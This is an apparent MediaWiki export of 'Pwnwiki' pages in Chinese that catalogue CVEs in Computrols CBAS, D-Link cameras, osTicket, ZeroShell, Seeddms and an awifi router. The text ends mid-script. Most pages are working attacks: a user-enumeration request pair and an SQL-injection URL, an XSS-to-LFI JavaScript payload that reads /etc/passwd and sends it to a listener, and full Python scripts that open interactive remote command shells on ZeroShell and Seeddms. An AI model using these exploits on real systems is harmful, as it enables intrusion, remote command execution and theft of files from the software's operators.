    <title>CVE-2019-10848 Computrols CBAS Web 用戶名枚舉漏洞</title>
    <ns>0</ns>
    <id>2053</id>
    <revision>
      <id>2478</id>
      <timestamp>2021-05-05T07:00:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== 19.0.0及以下   ==測試無效賬戶== &lt;pre&gt; POST /cbas/index.php?m=auth&amp;a=login HTTP/1.1  username=randomuser&amp;password=&amp;challenge=60753c1b5e449de80e21472b5..."</comment>
      <origin>2478</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="680" sha1="tcnxcxr5ipo9v4m5lryk20qw3ek6aem" xml:space="preserve">==漏洞影響==
19.0.0及以下


==測試無效賬戶==
&lt;pre&gt;
POST /cbas/index.php?m=auth&amp;a=login HTTP/1.1

username=randomuser&amp;password=&amp;challenge=60753c1b5e449de80e21472b5911594d&amp;response=e16371917371b8b70529737813840c62
&lt;/pre&gt;

Response
&lt;pre&gt;
&lt;!-- Failed login comments appear here --&gt;
&lt;p class="alert-error"&gt;randomuser&lt;/p&gt;
&lt;/pre&gt;

==測試有效賬戶==
&lt;pre&gt;
POST /cbas/index.php?m=auth&amp;a=login HTTP/1.1

username=admin&amp;password=&amp;challenge=6e4344e7ac62520dba82d7f20ccbd422&amp;response=e09aab669572a8e4576206d5c14befc5s
&lt;/pre&gt;

Response
&lt;pre&gt;
&lt;!-- Failed login comments appear here --&gt;
&lt;p class="alert-error"&gt;Invalid username/password combination.  Please try again!&lt;/p&gt;
&lt;/pre&gt;</text>
      <sha1>tcnxcxr5ipo9v4m5lryk20qw3ek6aem</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-10852 Computrols CBAS Web SQL注入漏洞</title>
    <ns>0</ns>
    <id>2055</id>
    <revision>
      <id>2479</id>
      <timestamp>2021-05-05T07:01:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== 19.0.0及以下   ==Payload== &lt;pre&gt; http://www.0-sec.org/cbas/index.php?m=servers&amp;a=start_pulling&amp;id=1 AND 2510 = 2510 &lt;/pre&gt;"</comment>
      <origin>2479</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="142" sha1="1nik81it56yx0i5ngg0e3wb1ry5otyv" xml:space="preserve">==影響版本==
19.0.0及以下


==Payload==
&lt;pre&gt;
http://www.0-sec.org/cbas/index.php?m=servers&amp;a=start_pulling&amp;id=1 AND 2510 = 2510
&lt;/pre&gt;</text>
      <sha1>1nik81it56yx0i5ngg0e3wb1ry5otyv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-10999 D-Link路由器 緩衝區錯誤漏洞</title>
    <ns>0</ns>
    <id>4842</id>
    <revision>
      <id>5580</id>
      <timestamp>2021-06-24T01:35:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; DCS-930L  DCS-931L  DCS-932L  DCS-933L  DCS-934L  DCS-5009L  DCS-5010L  DCS-5020L  DCS-5025L  DCS-5030L &lt;/pre&gt;  =..."</comment>
      <origin>5580</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="309" sha1="pj5b1mhgd6l4n5g53xbummz2bukspc1" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
DCS-930L

DCS-931L

DCS-932L

DCS-933L

DCS-934L

DCS-5009L

DCS-5010L

DCS-5020L

DCS-5025L

DCS-5030L
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
python3 exploit.py -i 192.168.0.100 -P 80 -u admin -p ""
&lt;/pre&gt;

&lt;pre&gt;
https://github.com/tacnetsol/CVE-2019-10999
&lt;/pre&gt;</text>
      <sha1>pj5b1mhgd6l4n5g53xbummz2bukspc1</sha1>
    </revision>
    <revision>
      <id>5581</id>
      <parentid>5580</parentid>
      <timestamp>2021-06-24T01:36:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5581</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="320" sha1="kg67mrvlqr4lsee8nzbztxhv5db46e2" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
DCS-930L

DCS-931L

DCS-932L

DCS-933L

DCS-934L

DCS-5009L

DCS-5010L

DCS-5020L

DCS-5025L

DCS-5030L
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
python3 exploit.py -i 192.168.0.100 -P 80 -u admin -p ""
&lt;/pre&gt;

&lt;pre&gt;
https://github.com/tacnetsol/CVE-2019-10999
&lt;/pre&gt;</text>
      <sha1>kg67mrvlqr4lsee8nzbztxhv5db46e2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-10999 D-Link路由器 緩衝區錯誤漏洞/zh-hant</title>
    <ns>0</ns>
    <id>6109</id>
    <revision>
      <id>6979</id>
      <timestamp>2021-07-10T09:45:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2019-10999 D-Link路由器 緩衝區錯誤漏洞"</comment>
      <origin>6979</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="284" sha1="lpugv1dnar9e0tyqp34r6fru9yz4g50" xml:space="preserve">&lt;languages /&gt;
==影響版本==
&lt;pre&gt;
DCS-930L

DCS-931L

DCS-932L

DCS-933L

DCS-934L

DCS-5009L

DCS-5010L

DCS-5020L

DCS-5025L

DCS-5030L
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
python3 exploit.py -i 192.168.0.100 -P 80 -u admin -p ""
&lt;/pre&gt;

&lt;pre&gt;
https://github.com/tacnetsol/CVE-2019-10999
&lt;/pre&gt;</text>
      <sha1>lpugv1dnar9e0tyqp34r6fru9yz4g50</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-10999 D-Link路由器 緩衝區錯誤漏洞/zh-tw</title>
    <ns>0</ns>
    <id>6083</id>
    <revision>
      <id>6953</id>
      <timestamp>2021-07-10T08:01:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2019-10999 D-Link路由器 緩衝區錯誤漏洞"</comment>
      <origin>6953</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="284" sha1="lpugv1dnar9e0tyqp34r6fru9yz4g50" xml:space="preserve">&lt;languages /&gt;
==影響版本==
&lt;pre&gt;
DCS-930L

DCS-931L

DCS-932L

DCS-933L

DCS-934L

DCS-5009L

DCS-5010L

DCS-5020L

DCS-5025L

DCS-5030L
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
python3 exploit.py -i 192.168.0.100 -P 80 -u admin -p ""
&lt;/pre&gt;

&lt;pre&gt;
https://github.com/tacnetsol/CVE-2019-10999
&lt;/pre&gt;</text>
      <sha1>lpugv1dnar9e0tyqp34r6fru9yz4g50</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-11537 osTicket 1.11 XSS&amp;本地文件包含漏洞</title>
    <ns>0</ns>
    <id>1616</id>
    <revision>
      <id>2020</id>
      <timestamp>2021-05-02T04:40:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: osTicket v1.11 - Cross-Site Scripting to Local File Inclusion # Date: 09.04.2019 # Exploit Author: Özkan Mustafa Akkuş (AkkuS) @ehakkus # Cont..."</comment>
      <origin>2020</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3870" sha1="j775jkmz845eg73d0pocvqt8ddu9esn" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: osTicket v1.11 - Cross-Site Scripting to Local File
Inclusion
# Date: 09.04.2019
# Exploit Author: Özkan Mustafa Akkuş (AkkuS) @ehakkus
# Contact: https://pentest.com.tr
# Vendor Homepage: https://osticket.com
# Software Link: https://github.com/osTicket/osTicket
# References: https://github.com/osTicket/osTicket/pull/4869
#             https://pentest.com.tr/exploits/osTicket-v1-11-XSS-to-LFI.html
# Version: v1.11
# Category: Webapps
# Tested on: XAMPP for Linux
# Description: This is exploit proof of concept as XSS attempt can
# lead to an LFI (Local File Inclusion) attack at osTicket.
##################################################################
# PoC

# There are two different XSS vulnerabilities in the "Import"
field on the Agent Panel - User Directory field. This vulnerability
causes a different vulnerability. The attacker can run the malicious
JS file that he uploads in the XSS vulnerability. Uploaded JS files
can be called clear text. Therefore, attackers do not have to use
a different server to perform an attack. Then it is possible to
create "Local File Inclusion" vulnerability too.

The attacker can upload a JS file as follows.
------------------------------------------------------------------

function readTextFile(file)
{
    var rawFile = new XMLHttpRequest();
    rawFile.open("GET", file, false);
    rawFile.onreadystatechange = function ()
    {
        if(rawFile.readyState === 4)
        {
            if(rawFile.status === 200 || rawFile.status == 0)
            {
                var allText = rawFile.responseText;
                allText.src = 'http://localhost:8001' +
rawFile.responseText;
                document.body.appendChild(allText);
            }
        }
    }
    rawFile.send(null);
}

readTextFile("/etc/passwd");

------------------------------------------------------------------

# Smilar JS File Link;

/upload/file.php?key=y3cxcoxqv8r3miqczzj5ar8rhm1bhcbm
&amp;expires=1554854400&amp;signature=be5cea87c37d7971e0c54164090a391066ecbaca&amp;id=36"

After this process, we can run the JS file in XSS vulnerability.


# Our First Request for XSS to LFI;
------------------------------------------------------------------

POST /upload/scp/users.php?do=import-users
Host: localhost
Content-Type: multipart/form-data; boundary=---------------------------[]


-----------------------------[]
Content-Disposition: form-data; name="__CSRFToken__"

8f6f85b8d76218112a53f909692f3c4ae7768b39
-----------------------------[]
Content-Disposition: form-data; name="pasted"


-----------------------------[]
Content-Disposition: form-data; name="import"; filename="users-20190408.csv"
Content-Type: text/csv

&lt;script src="
http://localhost/4/osTicket-v1.11/upload/file.php?key=y3cxcoxqv8r3miqczzj5ar8rhm1bhcbm&amp;expires=1554854400&amp;signature=be5cea87c37d7971e0c54164090a391066ecbaca&amp;id=36
"&gt;&lt;/script&gt;

-----------------------------[]--




# Our Second Request for XSS to LFI;
------------------------------------------------------------------
POST /upload/scp/ajax.php/users/import HTTP/1.1
Host: localhost

__CSRFToken__=8f6f85b8d76218112a53f909692f3c4ae7768b39&amp;pasted=%3Cscript+src%3D%22http%3A%2F%2Flocalhost%2F4%2FosTicket-v1.11%2Fupload%2Ffile.php%3Fkey%3Dy3cxcoxqv8r3miqczzj5ar8rhm1bhcbm%26expires%3D1554854400%26signature%3Dbe5cea87c37d7971e0c54164090a391066ecbaca%26id%3D36%22%3E%3C%2Fscript%3E&amp;undefined=Import+Users
------------------------------------------------------------------


# After sending XSS requests,
# When the attacker listens to port 8001, he/she will receive a request as
follows.

root@AkkuS:~# python -m SimpleHTTPServer 8001
Serving HTTP on 0.0.0.0 port 8001 ...
127.0.0.1 - - [09/Apr/2019 11:54:42] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [09/Apr/2019 11:54:42] "GET
/root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin...[More]
            
&lt;/pre&gt;</text>
      <sha1>j775jkmz845eg73d0pocvqt8ddu9esn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-12725 ZeroShell 3.9.0 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>2364</id>
    <revision>
      <id>2846</id>
      <timestamp>2021-05-13T09:27:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: ZeroShell 3.9.0 - Remote Command Execution  # Date: 10/05/2021 # Exploit Author: Fellipe Oliveira # Vendor Homepage: https://zeroshell.org/ # So..."</comment>
      <origin>2846</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2380" sha1="46486d7mbal7g1mcdrw9b5zsqkxrttk" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: ZeroShell 3.9.0 - Remote Command Execution 
# Date: 10/05/2021
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://zeroshell.org/
# Software Link: https://zeroshell.org/download/
# Version: &lt; 3.9.0 
# Tested on: ZeroShell 3.9.0
# CVE : CVE-2019-12725

#!/usr/bin/python3

import requests
import optparse
import time

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help='Base target uri (ex. http://target-uri/)')

options, args = parser.parse_args()
if not options.url:
    print('[+] Specify an url target')
    print('[+] Example usage: exploit.py -u http://target-uri/')
    print('[+] Example help usage: exploit.py -h')
    exit()

uri_zeroshell = options.url
session = requests.Session()

def command():
    try:
        check = session.get(uri_zeroshell + "/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type='%0Aid%0A'")
        if check.status_code == 200:
            flag = True
            print('[+] ZeroShell 3.9.0 Remote Command Execution')
            time.sleep(1)
            print('[+] Success connect to target')
            time.sleep(1)
            print('[+] Trying to execute command in ZeroShell OS...\n')
            time.sleep(1)
            check.raise_for_status()  

        while flag:
            cmd = raw_input("$ ")
            payload = "/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type='%0A" + cmd + "%0A'"
            uri_vuln = uri_zeroshell + payload
            burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
            res = session.get(uri_vuln, headers=burp0_headers, verify=False)
            print(res.text[:res.text.rindex("&lt;html&gt;") / 2])

    except requests.exceptions.ConnectionError as err:
        print('[x] Failed to Connect in: '+uri_zeroshell+' ')
        print('[x] This host seems to be Down')
        exit()
    except requests.exceptions.HTTPError as conn:
        print('[x] Failed to execute command in: '+uri_zeroshell+' ')
        print('[x] This host does not appear to be a ZeroShell')
        exit()

command()
&lt;/pre&gt;</text>
      <sha1>46486d7mbal7g1mcdrw9b5zsqkxrttk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-12744 Seeddms 5.1.10 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>5190</id>
    <revision>
      <id>5941</id>
      <timestamp>2021-06-25T11:24:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; Version: Seeddms 5.1.10  ==EXP== &lt;pre&gt; # Exploit Title: Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)..."</comment>
      <origin>5941</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8399" sha1="sys2dhyi0tly0fjfz1ida2winw1rxhw" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Version: Seeddms 5.1.10

==EXP==
&lt;pre&gt;
# Exploit Title: Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated) 
# Date: 25/06/2021
# Exploit Author: Bryan Leong &lt;NobodyAtall&gt;
# Vendor Homepage: https://www.seeddms.org/index.php?id=2
# Software Link: https://sourceforge.net/projects/seeddms/files/seeddms-5.0.11/
# Version: Seeddms 5.1.10
# Tested on: Windows 7 x64
# CVE: CVE-2019-12744

import requests
import argparse
import sys
import random
import string
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder

def sysArgument():
    ap = argparse.ArgumentParser()

    ap.add_argument("-u", "--username", required=True, help="login username")
    ap.add_argument("-p", "--password", required=True, help="login password")
    ap.add_argument("--url", required=True, help="target URL Path")

    args = vars(ap.parse_args())

    return args['username'], args['password'], args['url'] 

def login(sessionObj, username, password, url):
    loginPath = "/op/op.Login.php"    
    url += loginPath

    postData = {
        'login': username,
        'pwd': password,
        'lang' : 'en_GB'
    }
    try:
        rsl = sessionObj.post(url, data=postData)

        if(rsl.status_code == 200):
            if "Error signing in. User ID or password incorrect." in rsl.text:
                print("[!] Incorrect Credential.")
            else:
                print("[*] Login Successful.") 
                print("[*] Session Token: " + sessionObj.cookies.get_dict()['mydms_session'])
                return sessionObj                
                
        else:
            print("[!] Something went wrong.")    
            print("Status Code: %d" % (rsl.status_code))
            sys.exit(0)
    except Exception as e:
        print("[!] Something Went Wrong!")
        print(e)
        sys.exit(0)

    return sessionObj

def formTokenCapturing(sessionObj, url):
    path = "/out/out.AddDocument.php?folderid=1&amp;showtree=1"
    url += path
    formToken = ""

    try:        
        rsl = sessionObj.get(url)

        if(rsl.status_code == 200):
            print("[*] Captured Form Token.")

            #extracting form token
            soup = BeautifulSoup(rsl.text,'html.parser')
            form1 = soup.findAll("form", {"id": "form1"})
            
            soup = BeautifulSoup(str(form1[0]),'html.parser')
            formToken = soup.find("input", {"name": "formtoken"})            
            print("[*] Form Token: " + formToken.attrs['value'])
            
            return sessionObj, formToken.attrs['value']
        else:
            print("[!] Something went wrong.")    
            print("Status Code: %d" % (rsl.status_code))
            sys.exit(0)

    except Exception as e:
        print("[!] Something Went Wrong!")
        print(e)
        sys.exit(0)

    return sessionObj, formToken

def uploadingPHP(sessionObj, url, formToken):
    path = "/op/op.AddDocument.php"
    url += path

    #generating random name
    letters = string.ascii_lowercase
    rand_name = ''.join(random.choice(letters) for i in range(20))

    #POST Data
    payload = {
        'formtoken' : formToken,
        'folderid' : '1',
        'showtree' : '1',
        'name' : rand_name,
        'comment' : '',
        'keywords' : '',
        'sequence' : '2',
        'presetexpdate' : 'never',
        'expdate' : '',
        'ownerid' : '1',
        'reqversion' : '1',
        'userfile[]' : (
            '%s.php' % (rand_name),           
            open('phpCmdInjection.php', 'rb'), 
            'application/x-httpd-php'
            ),
        'version_comment' : ''
    }
    
    multiPartEncodedData = MultipartEncoder(payload)

    try:                
        rsl = sessionObj.post(url, data=multiPartEncodedData, headers={'Content-Type' : multiPartEncodedData.content_type})

        if(rsl.status_code == 200):
            print("[*] Command Injection PHP Code Uploaded.")
            print("[*] Name in Document Content Shows: " + rand_name)

            return sessionObj, rand_name
        else:
            print("[!] Something went wrong.")    
            print("Status Code: %d" % (rsl.status_code))
            sys.exit(0)


    except Exception as e:
        print("[!] Something Went Wrong!")
        print(e)
        sys.exit(0)

    return sessionObj, rand_name

def getDocID(sessionObj, url, docName):
    path = "/out/out.ViewFolder.php?folderid=1"
    url += path
    
    try:        
        rsl = sessionObj.get(url)

        if(rsl.status_code == 200):
            #searching &amp; extracting document id storing payload
            soup = BeautifulSoup(rsl.text,'html.parser')
            viewFolderTables = soup.findAll("table", {"id": "viewfolder-table"})
            
            soup = BeautifulSoup(str(viewFolderTables[0]),'html.parser')
            rowsDoc = soup.findAll("tr", {"class": "table-row-document"})            

            for i in range(len(rowsDoc)):
                soup = BeautifulSoup(str(rowsDoc[i]),'html.parser')
                tdExtracted = soup.findAll("td") 
                
                foundDocName = tdExtracted[1].contents[0].contents[0]

                #when document name matched uploaded document name
                if(foundDocName == docName):
                    print("[*] Found Payload Document Name. Extracting Document ID...")
                    tmp = tdExtracted[1].contents[0].attrs['href'].split('?')
                    docID = tmp[1].replace("&amp;showtree=1", "").replace('documentid=', '')

                    print("[*] Document ID: " + docID)

                    return sessionObj, docID

            #after loops &amp; still unable to find matched uploaded Document Name
            print("[!] Unable to find document ID.")
            sys.exit(0)
            
        else:
            print("[!] Something went wrong.")    
            print("Status Code: %d" % (rsl.status_code))
            sys.exit(0)

    except Exception as e:
        print("[!] Something Went Wrong!")
        print(e)
        sys.exit(0)

    return sessionObj

def shell(sessionObj, url, docID):
    #remove the directory /seeddms-5.1.x
    splitUrl = url.split('/')
    remLastDir = splitUrl[:-1]

    url = ""
    #recontruct url
    for text in remLastDir:
        url += text + "/"

    #path storing uploaded php code
    path = "/data/1048576/%s/1.php" % docID
    url += path

    #checking does the uploaded php exists?
    rsl = sessionObj.get(url)

    if(rsl.status_code == 200):
        print("[*] PHP Script Exist!")
        print("[*] Injecting some shell command.")

        #1st test injecting whoami command
        data = {
            'cmd' : 'whoami'
        }

        rsl = sessionObj.post(url, data=data)

        if(rsl.text != ""):
            print("[*] There's response from the PHP script!")
            print('[*] System Current User: ' + rsl.text.replace("&lt;pre&gt;", "").replace("&lt;/pre&gt;", ""))
            
            print("[*] Spawning Shell. type .exit to exit the shell", end="\n\n")
            #start shell iteration
            while(True):
                cmd = input("[Seeddms Shell]$ ")

                if(cmd == ".exit"):
                    print("[*] Exiting shell.")
                    sys.exit(0)

                data = {
                    'cmd' : cmd
                }

                rsl = sessionObj.post(url, data=data)
                print(rsl.text.replace("&lt;pre&gt;", "").replace("&lt;/pre&gt;", ""))

        else:
            print("[!] No response from PHP script. Something went wrong.")
            sys.exit(0)

    else:
        print("[!] PHP Script Not Found!!")
        print(rsl.status_code)
        sys.exit(0)




def main():    
    username, password, url = sysArgument()

    sessionObj = requests.Session()    

    #getting session token from logging in    
    sessionObj = login(sessionObj, username, password, url)

    #capturing form token for adding document
    sessionObj, formToken = formTokenCapturing(sessionObj, url)

    #uploading php code for system command injection
    sessionObj, docName = uploadingPHP(sessionObj, url, formToken)

    #getting document id
    sessionObj, docID = getDocID(sessionObj, url, docName)
    
    #spawning shell to exec system Command
    shell(sessionObj, url, docID)

if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>sys2dhyi0tly0fjfz1ida2winw1rxhw</sha1>
    </revision>
    <revision>
      <id>5942</id>
      <parentid>5941</parentid>
      <timestamp>2021-06-25T11:25:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5942</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8410" sha1="2yximxz0eo18htr12mw1tn95zagcgzp" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: Seeddms 5.1.10

==EXP==
&lt;pre&gt;
# Exploit Title: Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated) 
# Date: 25/06/2021
# Exploit Author: Bryan Leong &lt;NobodyAtall&gt;
# Vendor Homepage: https://www.seeddms.org/index.php?id=2
# Software Link: https://sourceforge.net/projects/seeddms/files/seeddms-5.0.11/
# Version: Seeddms 5.1.10
# Tested on: Windows 7 x64
# CVE: CVE-2019-12744

import requests
import argparse
import sys
import random
import string
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder

def sysArgument():
    ap = argparse.ArgumentParser()

    ap.add_argument("-u", "--username", required=True, help="login username")
    ap.add_argument("-p", "--password", required=True, help="login password")
    ap.add_argument("--url", required=True, help="target URL Path")

    args = vars(ap.parse_args())

    return args['username'], args['password'], args['url'] 

def login(sessionObj, username, password, url):
    loginPath = "/op/op.Login.php"    
    url += loginPath

    postData = {
        'login': username,
        'pwd': password,
        'lang' : 'en_GB'
    }
    try:
        rsl = sessionObj.post(url, data=postData)

        if(rsl.status_code == 200):
            if "Error signing in. User ID or password incorrect." in rsl.text:
                print("[!] Incorrect Credential.")
            else:
                print("[*] Login Successful.") 
                print("[*] Session Token: " + sessionObj.cookies.get_dict()['mydms_session'])
                return sessionObj                
                
        else:
            print("[!] Something went wrong.")    
            print("Status Code: %d" % (rsl.status_code))
            sys.exit(0)
    except Exception as e:
        print("[!] Something Went Wrong!")
        print(e)
        sys.exit(0)

    return sessionObj

def formTokenCapturing(sessionObj, url):
    path = "/out/out.AddDocument.php?folderid=1&amp;showtree=1"
    url += path
    formToken = ""

    try:        
        rsl = sessionObj.get(url)

        if(rsl.status_code == 200):
            print("[*] Captured Form Token.")

            #extracting form token
            soup = BeautifulSoup(rsl.text,'html.parser')
            form1 = soup.findAll("form", {"id": "form1"})
            
            soup = BeautifulSoup(str(form1[0]),'html.parser')
            formToken = soup.find("input", {"name": "formtoken"})            
            print("[*] Form Token: " + formToken.attrs['value'])
            
            return sessionObj, formToken.attrs['value']
        else:
            print("[!] Something went wrong.")    
            print("Status Code: %d" % (rsl.status_code))
            sys.exit(0)

    except Exception as e:
        print("[!] Something Went Wrong!")
        print(e)
        sys.exit(0)

    return sessionObj, formToken

def uploadingPHP(sessionObj, url, formToken):
    path = "/op/op.AddDocument.php"
    url += path

    #generating random name
    letters = string.ascii_lowercase
    rand_name = ''.join(random.choice(letters) for i in range(20))

    #POST Data
    payload = {
        'formtoken' : formToken,
        'folderid' : '1',
        'showtree' : '1',
        'name' : rand_name,
        'comment' : '',
        'keywords' : '',
        'sequence' : '2',
        'presetexpdate' : 'never',
        'expdate' : '',
        'ownerid' : '1',
        'reqversion' : '1',
        'userfile[]' : (
            '%s.php' % (rand_name),           
            open('phpCmdInjection.php', 'rb'), 
            'application/x-httpd-php'
            ),
        'version_comment' : ''
    }
    
    multiPartEncodedData = MultipartEncoder(payload)

    try:                
        rsl = sessionObj.post(url, data=multiPartEncodedData, headers={'Content-Type' : multiPartEncodedData.content_type})

        if(rsl.status_code == 200):
            print("[*] Command Injection PHP Code Uploaded.")
            print("[*] Name in Document Content Shows: " + rand_name)

            return sessionObj, rand_name
        else:
            print("[!] Something went wrong.")    
            print("Status Code: %d" % (rsl.status_code))
            sys.exit(0)


    except Exception as e:
        print("[!] Something Went Wrong!")
        print(e)
        sys.exit(0)

    return sessionObj, rand_name

def getDocID(sessionObj, url, docName):
    path = "/out/out.ViewFolder.php?folderid=1"
    url += path
    
    try:        
        rsl = sessionObj.get(url)

        if(rsl.status_code == 200):
            #searching &amp; extracting document id storing payload
            soup = BeautifulSoup(rsl.text,'html.parser')
            viewFolderTables = soup.findAll("table", {"id": "viewfolder-table"})
            
            soup = BeautifulSoup(str(viewFolderTables[0]),'html.parser')
            rowsDoc = soup.findAll("tr", {"class": "table-row-document"})            

            for i in range(len(rowsDoc)):
                soup = BeautifulSoup(str(rowsDoc[i]),'html.parser')
                tdExtracted = soup.findAll("td") 
                
                foundDocName = tdExtracted[1].contents[0].contents[0]

                #when document name matched uploaded document name
                if(foundDocName == docName):
                    print("[*] Found Payload Document Name. Extracting Document ID...")
                    tmp = tdExtracted[1].contents[0].attrs['href'].split('?')
                    docID = tmp[1].replace("&amp;showtree=1", "").replace('documentid=', '')

                    print("[*] Document ID: " + docID)

                    return sessionObj, docID

            #after loops &amp; still unable to find matched uploaded Document Name
            print("[!] Unable to find document ID.")
            sys.exit(0)
            
        else:
            print("[!] Something went wrong.")    
            print("Status Code: %d" % (rsl.status_code))
            sys.exit(0)

    except Exception as e:
        print("[!] Something Went Wrong!")
        print(e)
        sys.exit(0)

    return sessionObj

def shell(sessionObj, url, docID):
    #remove the directory /seeddms-5.1.x
    splitUrl = url.split('/')
    remLastDir = splitUrl[:-1]

    url = ""
    #recontruct url
    for text in remLastDir:
        url += text + "/"

    #path storing uploaded php code
    path = "/data/1048576/%s/1.php" % docID
    url += path

    #checking does the uploaded php exists?
    rsl = sessionObj.get(url)

    if(rsl.status_code == 200):
        print("[*] PHP Script Exist!")
        print("[*] Injecting some shell command.")

        #1st test injecting whoami command
        data = {
            'cmd' : 'whoami'
        }

        rsl = sessionObj.post(url, data=data)

        if(rsl.text != ""):
            print("[*] There's response from the PHP script!")
            print('[*] System Current User: ' + rsl.text.replace("&lt;pre&gt;", "").replace("&lt;/pre&gt;", ""))
            
            print("[*] Spawning Shell. type .exit to exit the shell", end="\n\n")
            #start shell iteration
            while(True):
                cmd = input("[Seeddms Shell]$ ")

                if(cmd == ".exit"):
                    print("[*] Exiting shell.")
                    sys.exit(0)

                data = {
                    'cmd' : cmd
                }

                rsl = sessionObj.post(url, data=data)
                print(rsl.text.replace("&lt;pre&gt;", "").replace("&lt;/pre&gt;", ""))

        else:
            print("[!] No response from PHP script. Something went wrong.")
            sys.exit(0)

    else:
        print("[!] PHP Script Not Found!!")
        print(rsl.status_code)
        sys.exit(0)




def main():    
    username, password, url = sysArgument()

    sessionObj = requests.Session()    

    #getting session token from logging in    
    sessionObj = login(sessionObj, username, password, url)

    #capturing form token for adding document
    sessionObj, formToken = formTokenCapturing(sessionObj, url)

    #uploading php code for system command injection
    sessionObj, docName = uploadingPHP(sessionObj, url, formToken)

    #getting document id
    sessionObj, docID = getDocID(sessionObj, url, docName)
    
    #spawning shell to exec system Command
    shell(sessionObj, url, docID)

if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>2yximxz0eo18htr12mw1tn95zagcgzp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-12862 天翼創維awifi路由器未授權訪問漏洞</title>
    <ns>0</ns>
    <id>1065</id>
    <revision>
      <id>1344</id>
      <timestamp>2021-04-10T01:50:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #coding: utf-8 #__author__: H4lo import requests import sys   payload = "authflag=1" UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, l..."</comment>
      <origin>1344</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1468" sha1="sodpk8hgh5e7adjo6dl7jpf1cllpc2g" xml:space="preserve">==POC==
&lt;pre&gt;
#coding: utf-8
#__author__: H4lo
import requests
import sys


payload = "authflag=1"
